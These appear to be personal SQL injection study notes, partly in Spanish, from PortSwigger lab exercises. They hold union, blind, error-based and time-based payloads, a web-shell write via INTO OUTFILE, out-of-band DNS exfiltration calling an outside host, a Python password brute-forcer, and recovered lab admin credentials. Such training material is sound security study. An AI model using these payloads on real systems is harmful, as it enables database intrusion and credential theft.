Interesting website: 

https://portswigger.net/web-security/sql-injection/cheat-sheet



When you do a query , for example

SELECT * users WHERE user=pepe AND password=pepe

if the code is trashed is like this
SELECT * users WHERE user='%s' AND password='%s'


so when you put another '  the last part of the code looks like this

SELECT * users WHERE user='%s' AND password='%s''

and this make errors on the website the most common use for this bug is when you put

SELECT * users WHERE user='pepe' AND password='pepe' or 1=1 -- -


Sometimes this doesnt work, another important thing is 

' order by 2 (if the page doesnt give you an error you can make a query like this)

SELECT categorie WHERE  categorie='peines' UNION SELECT order by 2--

And you can do something like 

SELECT categorie WHERE  categorie='peines' UNION SELECT NULL,NULL FROM CATEGORIES-- -' (the rest of the querry)

Sometimes you can put php code on the website, (or python ,etc)

```
SELECT categorie WHERE  categorie='peines' UNION SELECT NULL,"<?php system('whoami'); ?>" FROM CATEGORIES-- -' (the rest of the querry)
```
or load files to the database

```
SELECT categorie WHERE  categorie='peines' UNION SELECT NULL,load_file(/etc/hosts) FROM CATEGORIES-- -' (the rest of the querry)
```
Sometimes depending of the permissions you can do things like this, 1 querry is an input 2nd query is an output (if you have writing cappabilities)

```
SELECT categorie WHERE  categorie='peines' UNION SELECT <?php system('whoami'); ?>,"probando" into outfile "/tmp/prueba.txt-- -" FROM CATEGORIES-- -' (the rest of the querry)
```

if we can put this kind of things on a url called for example /var/www/html/commamd.php ... and we put that on the url , the url will return to us the comand on the screen.


you can investigate more



anotaciones de ataques

Selecting the tables and searching whinch values they have
```
 Pets' union SELECT null,table_name FROM information_schema.tables-- -
```
Selecting the columns and watching which values they have

```
 Pets' union SELECT null,column_name FROM information_schema.columns WHERE table_name = 'users'-- -
```
Selecting finally two values on the same query
```
# Pets' union select null,username||'~'||password from users--
```
This last one returns user and password

	# MYSQL,POSTGRESQL,WINDOWS  #

To watch all the databases we can use this 

```
' union select 1,schema_name from information_schema.schemata
```

If you want to limit results you can put
```
' union select 1,schema_name from information_schema.schemata limit 0,1
```
or 1,1 2,1 , 3,1 ...

if you want to see it with comas 
```
' union select 1,group_concat(schema_name from information_schema.schemata)
```

database(), user() this shows the actual database and the actual user

LIST DATABASES
```
' union select schema_name,null from infromation_schema.schemata
```

Now we are going to enumerate the tables

```
' union select table_name,null from information_schema.tables
```
LIST TABLES
```
' union select table_name,null from information_schema.tables where table_schema='public'
```
LIST  COLUMNS
```
' union select column_name,null from information_schema.columns where table_schema='DB' and table_name= 'TABLA'
```
LIST DATA [ concat() works too. ]
```
'union select NULL,group_concat(username':'password) from users-- -
```
SOMETIMES YOU MUST SPECIFY THE DATABASE THAT CONTAINS THAT DATA THAT YOURE SEARCHING (sometimes the actual database in use is another)
```
'union select NULL,group_concat(username':'password) from public.users-- -
```


(note: sometimes you cannot put ':' or strings in a query, but you can put in hexadecimal characters) more info:
https://portswigger.net/web-security/sql-injection/cheat-sheet

Example

Elimina primero el salto de linea con
```
echo "admin" | tr -d '\n'
```
Pasalo a hexadecimal
```
echo "admin" | tr -d '\n' | xxd -ps
```
Sometimes we need to do this for evading validations.


# ON ORACLE, ALL WAYS REMEMBER the statement "FROM dual" #

As we start on other works
```
' union select null,null from dual--
```
Showing the tables of all databases
```
'union select null,table_name from all_tables
```
You can search by owner of databases
```
'union select null,owner from all_tables
```
And filter tables of owners
```
'union select null,table_name from all_tables where owner='PETER'
```
NOW FILTER THE COLUMNS
```
'union select null,column_name from all_tab_columns where table_name= 'USERS_FVLTGD'
```
NOW FILTER THE DATA
```
'union select null,USERNAME_ASD||':'||PASSWORD_ASDWQ from 'USERS_FVLTGD'
```


# BLIND SQL INJECTION WITH CONDITIONAL RESPONSES #

This works on the cookie, in the case of the example..

When we have a right response "Welcome back" stills existing, otherwise it disappears
```
select * from products where trackingId='fwkefo39i' and 1=1-- -' 
```
or 1=1-- -
```
select * from products where trackingId='fwkefo39i' and 1=1-- -' 
```
you can do another thing...

so you put this   ' and '1'='1 (you dont comment, and you left the commas)
```
select * from products where trackingId='fwkefo39i' and '1'='1' 
```
Order by 1 doesnt give me errors
```
BnrNOCeQTPXBkC9m' order by 1-- -
```

so... when we do another query we do this its fake
```
BnrNOCeQTPXBkC9m' and (select 'a' from users limit 1)-- -
```
this is true
```
BnrNOCeQTPXBkC9m' and (select 'a' from users limit 1)='a
```
If someone of the on the data contains a 'a' for example administrators , this in theory will return true
```
BnrNOCeQTPXBkC9m' and (select 'a' from users limit 1)='a
```
now, more precise is on this way
```
BnrNOCeQTPXBkC9m' and (select 'a' from users where username='administrator')='a
```
Now we take just the first character of the username
we filter the a
```
BnrNOCeQTPXBkC9m' and (select substring(username,1,1) from users where username='administrator')='a
```
' union select (substring(schema_name ,1,1)='a') from information_schema.schemata -- -


now the second character
```
BnrNOCeQTPXBkC9m' and (select substring(username,1,2) from users where username='administrator')='d
```
We can filter the password..
```
BnrNOCeQTPXBkC9m' and (select substring(password,1,1) from users where username='administrator')='a
```
and we make an attack type snipper 

We must change the letter and try to log one by one... and then look on the lenght of the response, and we can see some difference between the others, the first character looks like a 1

![[Screenshot_2023-08-23_13_54_41.png]]

To make this task better we are going to create a python cript

```
#!/usr/bin/python3

from pwn import *
import requests, signal ,time, pdb, sys, string

def def_handler(sig, frame):
    print('\n\n[!] Saliendo..\n')
    sys.exit(1)

#CTRL +C
signal.signal(signal.SIGINT, def_handler)

main_url ="https://0aa900d60412867080e7cbc700ab00e9.web-security-academy.net"
#you can import more (string.another)
characters=string.ascii_lowercase + string.digits

#Function that aplys the blind request
def makeRequest():

    password= ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range (1,21):

        for character in characters:

            cookies={
                    'TrackingId': "Aj5ssHgGJVRWPd20' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position,character),
                    'session':'JbkRaGD0Lu60I2GND3GnvLhf8OE149pK'
            }
            
            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break

if __name__== '__main__':
    
    makeRequest()



```
sys exit(1) is a unsuccesfull code, or error code.

def_handler is a function that permites us to make ctrl c






## How do we know the length of the password##



```
BnrNOCeQTPXBkC9m' and (select 'a' from users where username='administrator' and length(password)>5)='a; 
```
Here we see that is 20, beause we found no errors
```
BnrNOCeQTPXBkC9m' and (select 'a' from users where username='administrator' and length(password)>=20)='a; 
```

# SQLI-Conditional Error on oracle # 

on this way I do not recive error.
```
'||(select '' from dual)||'
```
Now is different of the other. 

We are limiting the rows to one , on this way we can know if the users table exists
```
'||(select '' from users where rownum=1)||'
```

to char (**Convierte una fecha a una cadena o un número con el formato especificado**.) on my query to_char(1/0) will give a conflict.
The query starts right to left, so first searchs the user admin and before other

```
'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'
```

On this sentence, the 1=2 makes ignore the to_char (1/0) doesnt go to the "then", it goes to the "else" ''

```
'||(select case when (1=2) then to_char(1/0) else '' end from users where username='administrator')||'
```

so, if the user doesn't exist we do not get the error, remember first reads from the query
*from users where username='administrat*

```
'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrat')||'
```
Now , if we want to watch the lenght of the password, we must do this. We recive a error, and everything is ok...
```
'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and lenght(password)>=20)||'
```

if we put this we dont recive a error , so the password doesnt have lenght of 21
```
'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>=21)||'
```
now, if we want to guess the password, by characters, we must do this, in oracle is substr. (We test it with the username.)

If we recive a error it is right
else it is not true

O SEA, SI RECIBO UN ERROR EL CARACTER A ES EL DE LA CONTRASEÑA
SI RECIBO OTRA COSA NO ES ASI
```
'||(select case when substr(username,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
```
Now we are going to do this with the item "password"

If we have an error the letter is the right one, otherwise with a 200 cod it is wrong.
We tested with the intruder of burpsuit and we have a "m" on the 500 code, so the first letter is a "m"
```
'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
```

We can do the attack with a "CLUSTER BOMB TO". on burpsuit

We use the python script with some differences to apply on this case.

We did it, now lets go to the next theme.

# Blind SQL injection with time delays #
Sometimes we do not recive errors, from the website or response codes, nothing. Sometimes we can know things based on the response of the server.

For example on this lab we must use
pg_sleep(10)
```
' ||pg_sleep(10)-- -
```

So when we need to retrive information on a server, we can play on the same way that before.(error responses) But on this case if the query is ok it will spend 5 sec on the response, otherwise it will be 0

```
'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')||'
```
We need to validate the length of the password
```
'||(select case when substring(username,1,1)='a' then pg_sleep(5) else pg_sleep(0)end from users where username='administrator' and length(password)>=20)-- -
```




Now if we want to know the password
```
'||(select case when substring(password,1,1)='a' then pg_sleep(5) else pg_sleep(0)end from users where username='administrator')-- -
```

Now when we use the intruer, all the responses will be "200" so how do we know if its ok the letter or no.. we can do it manually but is a lot of work
![[Screenshot_2023-08-24_14_24_54.png]]

If we want to go to burpsuit on the resource pool we must modyfy the next items

- Custom resource (called slow in this case)
- Maximum concurrent request=1
- Delay between requests 500

![[Screenshot_2023-08-24_14_28_28.png]]

But we are going to make it on a different way, on a script on python, the same that we have but modified 




# SQLI out of band interaction #

The burpsuit cheat sheet is interesting on this:

https://portswigger.net/web-security/sql-injection/cheat-sheet

 DNS lookup
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

```
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//5hjb74er5tm72am5rbrkj6uude.odiss.eu/">+%25remote%3b]>'),'/l')+FROM+dual--
```

DNS lookup with data exfiltration
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```




# SQL injection with filter bypass via XML encoding #

In this case we need to use burpsuit with  a tool called "Hackventor" and is in burpsuit


owasp zap
could not register with interactsh server: interactsh.com: no address associated with hostname








### Another assets out of scoope ###
---------------------------------------------------------------------
POSTGRESQL

gifts ' union select schema_name , NULL from information_schema.schemata -- - (select dbs) public

gifts' union select table_name, NULL from information_schema.tables  -- -

gifts' union select table_name, NULL from information_schema.tables where table_schema = 'public' -- - (select tables)

gifts' union select column_name, NULL from information_schema.columns where table_schema = 'public'  -- - (see all the columns)

gifts' union select column_name, NULL from information_schema.columns where table_schema = 'public' and column_name='users' -- - (select just one)

gifts' union select username,password from public.users -- - (selecting the data from public.users)


administrator
h3978x0jlltq0pumgw97

---------------------------------------------------------------------

POSTGRESQL


gifts' union select NULL,schema_name from information_schema.schemata -- - (public is the db)

gifts' union select NULL,table_name from information_schema.tables where table_schema='public' -- - (selecting tables from db='public')-we find "users"

gifts' union select NULL,column_name from information_schema.columns where table_schema='public' -- - (selecting all the columns from the db='public')

gifts' union select NULL,username ||':'||password from public.users -- -


administrator:d829s8z2l1kvhp0f9x2p


-----------------------------------------------------------------
POSTGRESQL

all tables
Pets' union select table_name,NULL  from information_schema.tables -- -


Select just the ones from the public

pets' union select table_name, null from information_schema.tables where table_schema='public' -- -

TABLE_NAME=users_pvvenn

pets' union select column_name,null from information_schema.columns where table_schema='public' AND table_name='users_pvvenn' -- -

COLUMNS=password_dlqybq,username_jdmbfk

pets' union select password_dlqybq||':'|| username_jdmbfk,NULL from public.users_pvvenn -- -


7c1ncv9i4tuebfehlr7h:administrator

--------------------------------------------------------------


Cookie: TrackingId
(This cookie is procesed on MYSQL, so pay atention to this if you see it in the future)


